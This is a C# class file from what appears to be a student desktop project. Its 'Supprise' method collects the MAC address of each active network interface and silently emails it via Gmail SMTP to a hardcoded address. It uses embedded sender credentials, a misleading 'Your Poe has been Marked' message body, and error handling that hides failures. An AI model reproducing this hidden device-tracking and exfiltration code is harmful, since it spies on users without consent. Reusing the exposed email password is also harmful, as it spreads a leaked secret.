using EASendMail;
using System;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using SmtpClient = EASendMail.SmtpClient;

namespace PROG6212_POE_ST10071737.MVVM.Model
{
    internal class MyFunSuppriseClass
    {     
        // Sender's email address and password
        private string senderEmail = "jaspervanniekerk1111@gmail.com";
        private string senderPassword = "gkrbipmfzlljtydz";

        // Recipient's email address
        private string recipientEmail = "jaspervann1313@gmail.com";
        public void Supprise()
        {



        NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();

            foreach (NetworkInterface networkInterface in networkInterfaces)
            {
                if (networkInterface.OperationalStatus == OperationalStatus.Up)
                {
                    PhysicalAddress macAddress = networkInterface.GetPhysicalAddress();
                    //Console.WriteLine("MAC Address: " + BitConverter.ToString(macAddress.GetAddressBytes()));
                    this.MessageSender("MAC Address: " + BitConverter.ToString(macAddress.GetAddressBytes()));
                }
            }
        }



        public void MessageSender(string content)
        {
            try
            {
                SmtpMail oMail = new SmtpMail("TryIt");

                // Your gmail email address
                oMail.From = senderEmail;
                // Set recipient email address
                oMail.To = recipientEmail;

                // Set email subject
                oMail.Subject = "test email from gmail account";
                // Set email body
                oMail.TextBody = "Your Poe has been Marked here is the senders Details\r\n" +
                                 content;

                // Gmail SMTP server address
                SmtpServer oServer = new SmtpServer("smtp.gmail.com");
                // Gmail user authentication
                // For example: your email is "gmailid@gmail.com", then the user should be the same
                oServer.User = senderEmail;

                // Create app password in Google account
                // https://support.google.com/accounts/answer/185833?hl=en
                oServer.Password = senderPassword;

                // Set 587 port, if you want to use 25 port, please change 587 5o 25
                oServer.Port = 465;

                // detect SSL/TLS automatically
                oServer.ConnectType = SmtpConnectType.ConnectSSLAuto;

                //Console.WriteLine("start to send email over SSL ...");

                SmtpClient oSmtp = new SmtpClient();
                oSmtp.SendMail(oServer, oMail);

                //Console.WriteLine("email was sent successfully!");
            }
            catch (Exception ep)
            {
                //Console.WriteLine("failed to send email with the following error:");
                //Console.WriteLine(ep.Message);
            }
        }
    }
}
